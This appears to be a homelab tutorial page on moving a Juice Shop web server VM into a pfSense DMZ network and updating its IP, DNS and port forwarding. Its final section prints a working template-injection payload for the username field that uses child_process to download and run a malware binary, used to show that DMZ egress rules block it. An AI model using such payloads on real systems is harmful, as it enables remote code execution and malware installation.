---
title: 08 Move juicero to DMZ
type: docs
---

## Change juicero VM NIC
First, I'll change the `juicero` VM virtual network interface card (NIC) settings. I go to the VM's virtual hardware view, and change the NIC network source from the `LAN` to the new `DMZ` network, and click the "Apply" button.

## Move juicero to DMZ network
I'll move the `juicero` web server to the `DMZ` network by changing the network settings for its NIC. I had previously assigned it the static IP `192.168.1.10` in the `LAN` network (the `LAN` virtual network has the address `192.168.1.0/24`). I'll change it to `192.168.2.10` for the `DMZ` network (which has the address `192.168.2.0/24`).

I'll do it by directly using the `juicero` VM, because can't SSH from the `sysadmin` while I change the network connection used by SSH.

I'll use the same `set-static-ip.sh` script I added when I moved `juicero` to the `LAN` network. 
```
./set-static-ip.sh
```


But I'll change the IP address I assign to be `192.168.2.10`:
```
Enter NetworkManager connection name [enp1s0]: 
Enter Static IP address: 192.168.2.10
Enter CIDR (subnet mask, e.g., 24 for 255.255.255.0) [24]: 
Enter default gateway [192.168.2.1]: 
Enter preferred DNS [192.168.2.1]: 
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/3)
IP4.ADDRESS[1]:                         192.168.2.10/24
IP4.GATEWAY:                            192.168.2.1
IP4.ROUTE[1]:                           dst = 192.168.2.0/24, nh = 0.0.0.0, mt = 100
IP4.ROUTE[2]:                           dst = 0.0.0.0/0, nh = 192.168.1.1, mt = 100
IP4.DNS[1]:                             192.168.2.1
IP4.ADDRESS[1]:                         127.0.0.1/8
IP4.GATEWAY:                            --
```

## Ping juicero
To test the move, I try pinging the `juicero` server's new IP address at `192.168.2.10` from the `sysadmin` machine. It can ping:
```
ping 192.168.2.10
```

However, I'm not able to ping the IP address of `sysadmin` (let's say it was leased `192.168.1.100` from the `pfsense` DHCP service) from `juicero`:
```
ping 192.168.1.100
```

That's because the pfSense firewall software doesn't give the new "DMZ" interface the same default "Allow" firewall rules like it did with the "LAN" network.

If I want to allow devices in the DMZ to ping devices outside of the DMZ, I would need to create a firewall rule for the "DMZ" interface allowing the ICMP protocol. I don't find a need for that, so I won't. This is following the "principle of least privilege". If `juicero` requires access to a device outside of the "DMZ" to function, I'll start adding a firewall rule specificially for that. But it starts at 0. No firewall rule. Not until there's a good reason to add one.

## Update DNS Resolve Service
I had previously added the `juicero` IP address and hostname to the `pfsense` DNS Resolve service. Now that I'm changing its static IP from `192.168.1.10` to `192.168.2.10` (from `LAN` network to new `DMZ` network) I need to update that entry. After applying the change, should be able to ping `juicero` from `sysadmin` using its hostname:
```
ping juicero
```

## Update NAT Port Forwarding
I need to change the port forwarding settings I had created that allows users to access the `pfsense` web application. Previously, a user on the `default` virtual network could access the `juicero` web server by making an HTTP request to the `pfsense` firewall server, and that would be redirected to the old IP address for `juicero`: `192.168.1.10`.

In the pfSense firewall admin tool webConfigurator, this port forwarding is referenced in 2 places: the port forwarding setting at `Firewall / NAT / Port Forward` and the firewall rule at `Firewall / Rules / WAN`. 

I can't modify the firewall rule, because it's associated with the NAT port forwarding. So, I modify the NAT port forwarding setting. I change the setting to use the new IP address for `juicero`, `192.168.2.10`:

This automatically changes that WAN rule at `Firewall / Rules / WAN`. Now, the user on the `customer` VM can continue accessing the `juicero` web server via the `pfsense` firewall.

## Test customer Using juicero
To test if the move is configured correctly, I'll use the `customer` and `hacker` VMs again.

From the `customer` VM, I'll login and try adding products to their basket.

## Test hacker Exploiting juicero Malware Download
Using the `sysadmin` VM, I SSH into the `juicero` server. 
```
ssh vmadmin@juicero
```


And list the `/opt/juice-shop` directory for the `malware` file:
```
sudo ls -lh /opt/juice-shop/malware
```

If it's there from the previous exploit, I can remove it.

From the `hacker` VM, I'll try the same malware attack that occurred when the `juicero` server was in the `LAN`. I'll go to the profile page, and put the same text in the username field:
```
#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/juice-shop/juicy-malware/raw/master/juicy_malware_linux_amd_64 && chmod +x malware && ./malware')}
```

Using the `sysadmin` SSH connection on `juicero`, I list the `/opt/juice-shop` directory for the `malware` file:
```
sudo ls -lh /opt/juice-shop/malware
```

It's there, but the file size is 0. That's because the [remote code execution](https://www.cloudflare.com/learning/security/what-is-remote-code-execution/) vulnerability is still there. The code was executed to download the file from github. But there wasn't a firewall rule allowing `juicero` (now in the `DMZ` network) to access the internet. So the `malware` file size is zero.

As a test, you can create a pfSense firewall rule for the "DMZ" interface allowing TCP and UDP traffic. Then, go on the `hacker` VM and repeat the exploit. Check the `malware` file:
```
sudo ls -lh /opt/juice-shop/malware
```
The `malware` file in the `juicero` directory `/opt/juice-shop` now has over 6 MB. If I delete that DMZ pfsense firewall rule, delete the `malware` file, and try again, it's back and has 0 MB.